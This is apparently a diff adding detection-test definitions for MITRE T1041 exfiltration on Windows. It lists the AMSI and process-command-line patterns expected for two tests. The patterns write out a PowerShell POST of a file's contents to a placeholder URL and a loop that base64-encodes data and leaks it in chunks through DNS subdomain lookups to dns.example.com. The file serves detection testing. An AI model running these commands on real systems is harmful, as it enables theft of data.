@@ -1,0 +1,21 @@
+T1041,windows,d1253f6e,C2 Data Exfiltration
+ARG,destination_url,example.com
+ARG,filepath,$env:TEMP\LineNumbers.txt
+_E_,AMSI,scan_content~=Invoke-WebRequest -Uri #{destination_url} -Method POST -Body $filecontent -DisableKeepAlive
+
+T1041,windows,c9207f3e,Text Based Data Exfiltration using DNS subdomains
+FYI,Test fails
+ARG,dns_server,dns.example.com
+ARG,exfiltrated_data,SecretDataToExfiltrate
+ARG,chunk_size,63
+_E_,Process,cmdline~=$dnsServer = "#{dns_server}"
+_E_,Process,cmdline~=$exfiltratedData = "#{exfiltrated_data}"
+_E_,Process,cmdline~=$chunkSize = #{chunk_size}
+_E_,Process,cmdline~=$encodedData = [System.Text.Encoding]::UTF8.GetBytes($exfiltratedData)
+_E_,Process,cmdline~=$encodedData = [Convert]::ToBase64String($encodedData)
+_E_,Process,cmdline~=$chunks = $encodedData -split "(.{$chunkSize})"
+_E_,Process,cmdline~=foreach ($chunk in $chunks) {
+_E_,Process,cmdline~=    $dnsQuery = $chunk + "." + $dnsServer
+_E_,Process,cmdline~=    Resolve-DnsName -Name $dnsQuery
+_E_,Process,cmdline~=    Start-Sleep -Seconds 5
+_E_,Process,cmdline~=}
